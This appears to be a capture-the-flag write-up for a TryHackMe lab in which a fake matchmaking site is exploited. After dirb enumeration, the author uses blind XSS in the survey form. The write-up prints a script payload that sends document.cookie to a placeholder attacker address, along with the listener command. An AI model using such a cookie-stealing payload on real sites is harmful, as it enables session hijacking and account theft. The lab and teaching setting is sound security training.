```
   __                     _ _ _                                       
  /  )            /o     ' ) ) )     _/_    /                /        
 /   . . _   o __/ '_     / / / __.  /  _. /_  ______  __.  /_  _  __ 
(__/(_/_/_)_<_(_/_ /_)_  / ' (_(_/|_<__(__/ /_/ / / <_(_/|_/ <_</_/ (_
       /                                                              
      '
```
Tired of soulless AI algorithms? At Cupid's Matchmaker, real humans read your personality
survey and personally match you with compatible singles. Our dedicated matchmaking team
reviews every submission to ensure you find true love this Valentine's Day!
No algorithms. No AI. Just genuine human connection. [^1]

What is the flag upon using web exploitation skills against this service?
-----------------------------------------------------------------------------------------
Upon opening the web application, we are prompted with a simple survey application that
a human will review. At first, we start by scanning the pages on the web app with `dirb`
and thus discover the pages */admin*, */logout* and */login* besides the */survey*. The
secret login page immediately intrigues us (the admin and logout page redirect to it),
but even after long search of potential vulnerabilities, we are not rewarded with any
clue as to how to proceed. Finally, we investigate the survey page again, and suspect a
potential *Cross-Site Scripting* (XSS) vulnerability to be present in the input form.
Since the input is not reflected to us, we have to find another way to communicate with
the human victim clicking on our survey form for review. A common way to this, is to
start a server on our attacking machine, e.g. with `python3 -m http.server 8080` and then
connect to it through a XSS attack, with an additional cookie payload:
```html
<script>fetch("http://<ATTACKING_MACHINE_IP_ADDRESS>:8080/" + document.cookie)</script>
```
This simple JavaScript code can now be included in any of the forms in the survey. And
indeed, it works as we can observe HTTP requests immediately after submitting the survey.
The *flag* cookie can now be observed to be a file that is requested on our server.

[^1]: https://tryhackme.com/room/lafb2026e3
